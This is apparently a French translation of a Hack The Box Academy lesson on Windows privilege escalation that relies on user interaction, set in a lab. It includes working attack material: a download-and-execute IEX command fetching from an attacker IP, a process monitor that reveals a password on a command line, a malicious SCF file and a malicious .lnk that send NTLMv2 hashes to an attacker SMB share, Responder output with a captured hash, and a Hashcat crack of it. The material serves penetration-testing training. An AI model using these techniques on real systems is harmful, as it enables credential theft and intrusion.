Interagir avec les utilisateurs
======================

* * * * *

Les utilisateurs sont parfois le maillon faible d'une organisation. Un employé surchargé travaillant rapidement peut ne pas remarquer que quelque chose est "éteint" sur sa machine lorsqu'il navigue sur un lecteur partagé, clique sur un lien ou exécute un fichier. Comme indiqué tout au long de ce module, Windows nous présente une énorme surface d'attaque, et il y a beaucoup de choses à vérifier lors de l'énumération des vecteurs d'escalade de privilèges locaux. Une fois que nous avons épuisé toutes les options, nous pouvons examiner des techniques spécifiques pour voler les informations d'identification d'un utilisateur sans méfiance en reniflant son trafic réseau/commandes locales ou en attaquant un service vulnérable connu nécessitant une interaction de l'utilisateur. L'une de mes techniques préférées consiste à placer des fichiers malveillants autour de partages de fichiers fortement consultés dans le but de récupérer les hachages de mot de passe utilisateur pour les casser hors ligne ultérieurement.

* * * * *

Capture de trafic
---------------

Si `Wireshark` est installé, les utilisateurs non privilégiés peuvent être en mesure de capturer le trafic réseau, car l'option permettant de restreindre l'accès du pilote Npcap aux administrateurs uniquement n'est pas activée par défaut.

![image](https://academy.hackthebox.com/storage/modules/67/pcap.png)

Ici, nous pouvons voir un exemple approximatif de capture d'informations d'identification FTP en clair saisies par un autre utilisateur tout en étant connecté à la même boîte. Bien que peu probable, si `Wireshark` est installé sur une boîte sur laquelle nous atterrissons, cela vaut la peine d'essayer une capture de trafic pour voir ce que nous pouvons capter.

![image](https://academy.hackthebox.com/storage/modules/67/ftp.png)

Supposons également que notre client nous positionne sur une machine d'attaque au sein de l'environnement. Dans ce cas, il vaut la peine d'exécuter `tcpdump` ou `Wireshark` pendant un certain temps pour voir quels types de trafic sont transmis sur le câble et si nous pouvons voir quelque chose d'intéressant. L'outil [net-creds](https://github.com/DanMcInerney/net-creds) peut être exécuté à partir de notre boîte d'attaque pour renifler les mots de passe et les hachages à partir d'une interface en direct ou d'un fichier pcap. Il vaut la peine de laisser cet outil s'exécuter en arrière-plan lors d'une évaluation ou de l'exécuter sur un pcap pour voir si nous pouvons extraire des informations d'identification utiles pour l'escalade de privilèges ou le mouvement latéral.

* * * * *

Traiter les lignes de commande
---------------------

#### Surveillance des lignes de commande de processus

Lors de l'obtention d'un shell en tant qu'utilisateur, il peut y avoir des tâches planifiées ou d'autres processus en cours d'exécution qui transmettent des informations d'identification sur la ligne de commande. Nous pouvons rechercher des lignes de commande de processus en utilisant quelque chose comme ce script ci-dessous. Il capture les lignes de commande du processus toutes les deux secondes et compare l'état actuel avec l'état précédent, en affichant toutes les différences.

Surveillance des lignes de commande de processus

```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}

```

#### Exécution du script Monitor sur l'hôte cible

Nous pouvons héberger le script sur notre machine d'attaque et l'exécuter sur l'hôte cible comme suit.

Exécution du script Monitor sur l'hôte cible

```
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1')

InputObject SideIndicator
----------- -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid :{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>
@{CommandLine="C:\Windows\system32\cmd.exe" } =>
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4} =>
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd} =>
@{CommandLine="C:\Windows\system32\backgroundTaskHost.exe" -NomServeur :CortanaUI.AppXy7vb4pc2... <=

```

Cela réussit et révèle le mot de passe de l'utilisateur de domaine `sqlsvc` , que nous pourrions ensuite éventuellement utiliser pour accéder à l'hôte SQL02 ou potentiellement trouver des données sensibles telles que les informations d'identification de la base de données sur le partage `backups` .

* * * * *

Services vulnérables
-------------------

Nous pouvons également rencontrer des situations où nous atterrissons sur un hôte exécutant une application vulnérable qui peut être utilisée pour élever les privilèges grâce à l'interaction de l'utilisateur. [CVE-2019--15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) en est un excellent exemple. Il s'agissait d'une vulnérabilité dans Docker Desktop Community Edition avant 2.1.0.1. Lorsque cette version particulière de Docker démarre, elle recherche plusieurs fichiers différents, notamment `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., qui n'existent pas avec une installation Docker. Le programme recherche ces fichiers dans `C:\PROGRAMDATA\DockerDesktop\version-bin\`. Ce répertoire a été mal configuré pour autoriser un accès en écriture complet au groupe `BUILTIN\Users` , ce qui signifie que tout utilisateur authentifié sur le système peut y écrire un fichier (comme un exécutable malveillant).

Tout exécutable placé dans ce répertoire s'exécute lorsque a) l'application Docker démarre et b) lorsqu'un utilisateur s'authentifie à l'aide de la commande `docker login`. Alors qu'unun peu plus ancien, il n'est pas impossible de rencontrer le poste de travail d'un développeur exécutant cette version de Docker Desktop, c'est pourquoi il est toujours important d'énumérer soigneusement les logiciels installés. Bien que cette faille particulière ne nous garantisse pas un accès élevé (puisqu'elle repose sur un redémarrage du service ou une action de l'utilisateur), nous pourrions planter notre exécutable lors d'une évaluation à long terme et vérifier périodiquement s'il fonctionne et si nos privilèges sont élevés.

* * * * *

SCF sur un partage de fichiers
-------------------

Un fichier de commande Shell (SCF) est utilisé par l'Explorateur Windows pour déplacer les répertoires vers le haut et vers le bas, afficher le bureau, etc. Un fichier SCF peut être manipulé pour que l'emplacement du fichier d'icône pointe vers un chemin UNC spécifique et que l'Explorateur Windows démarre une SMB session lors de l'accès au dossier où réside le fichier .scf. Si nous remplaçons IconFile par un serveur SMB que nous contrôlons et exécutons un outil tel que [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson /Inveigh), ou [InveighZero](https://github.com/Kevin-Robertson/InveighZero), nous pouvons souvent capturer les hachages de mot de passe NTLMv2 pour tous les utilisateurs qui parcourent le partage. Cela peut être particulièrement utile si nous obtenons un accès en écriture à un partage de fichiers qui semble être très utilisé ou même à un répertoire sur le poste de travail d'un utilisateur. Nous pouvons être en mesure de capturer le hachage du mot de passe d'un utilisateur et d'utiliser le mot de passe en clair pour augmenter les privilèges sur l'hôte cible, au sein du domaine, ou pour accéder/obtenir un accès à d'autres ressources.

#### Fichier SCF malveillant

Dans cet exemple, créons le fichier suivant et nommons-le quelque chose comme `@Inventory.scf` (similaire à un autre fichier dans le répertoire, afin qu'il ne semble pas déplacé). Nous mettons un `@` au début du nom de fichier pour qu'il apparaisse en haut du répertoire afin de garantir qu'il est vu et exécuté par l'Explorateur Windows dès que l'utilisateur accède au partage. Ici, nous mettons notre adresse IP `tun0` et tout faux nom de partage et nom de fichier .ico.

Fichier SCF malveillant

```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop

```

#### Début du répondeur

Ensuite, démarrez Responder sur notre boîte d'attaque et attendez que l'utilisateur parcoure le partage. Si tout se passe comme prévu, nous verrons le hachage du mot de passe NTLMV2 de l'utilisateur dans notre console et tenterons de le déchiffrer hors ligne.

Premier répondant

```
dsgsec@htb[/htb]$ sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun2]
    Responder IP               [10.10.14.3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[!] Error starting SSL server on port 443, check permissions or other servers running.
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...

```

#### Craquage du hachage NTLMv2 avec Hashcat

Nous pourrions alors tenter de déchiffrer ce hachage de mot de passe hors ligne à l'aide de `Hashcat` pour récupérer le texte en clair.

Craquage du hachage NTLMv2 avec Hashcat

```
dsgsec@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) démarrage...

<SNIP>

Accès au cache du dictionnaire :
* Nom de fichier.. : /usr/share/wordlists/rockyou.txt
* Mots de passe. : 14344385
* Octets......: 139921507
* Espace clé.. : 14344385

ADMINISTRATEUR ::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Bienvenue1

Séance..........: hashcat
Statut........... : fissuré
Hash.Name........ : NetNTLMv2
Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000
Heure.Débutéd......: jeu 27 mai 19:16:18 2021 (1 sec)
Heure.Estimée... : jeu 27 mai 19:16:19 2021 (0 secs)
Guess.Base....... : Fichier (/usr/share/wordlists/rockyou.txt)
Devine.Queue...... : 1/1 (100,00 %)
Vitesse.#1......... : 1 233,7 kH/s (2,74 ms) @ Accel : 1 024 Boucles : 1 Thr : 1 Vec : 8
Récupéré........ : 1/1 (100,00 %) Résumés
Progression.........: 43008/14344385 (0.30%)
Rejeté......... : 0/43008 (0,00 %)
Point.de.restauration.... : 36864/14344385 (0,26 %)
Restore.Sub.#1... : Salt : 0 Amplificateur : 0-1 Itération : 0-1
Candidats.#1....: holabebe -> plus difficile

Début : jeu. 27 mai 19:16:16 2021
Arrêté : jeu 27 mai 19:16:20 2021

```

Remarque : dans notre exemple, attendez 2 à 5 minutes que « l'utilisateur » parcoure le partage après avoir démarré Responder.

* * * * *

Capturer des hachages avec un fichier .lnk malveillant
------------------------------------------------

Cette attaque ne fonctionne plus sur les hôtes Server 2019, mais nous pouvons obtenir le même effet en utilisant un [.lnk] malveillant (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339 -4d0c-a68d-bf1d6cc0f943). Nous pouvons utiliser divers outils pour générer un fichier .lnk malveillant, comme [Lnkbomb](https://github.com/dievus/lnkbomb), car ce n'est pas aussi simple que de créer un fichier .scf malveillant. On peut aussi en fabriquer un en utilisant quelques lignes de PowerShell :

#### Génération d'un fichier .lnk malveillant

Génération d'un fichier .lnk malveillant

```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Essayez cette technique sur l'hôte cible pour vous familiariser avec la méthodologie et ajouter une autre tactique à votre arsenal lorsque vous rencontrez des environnements où Server 2019 est répandu.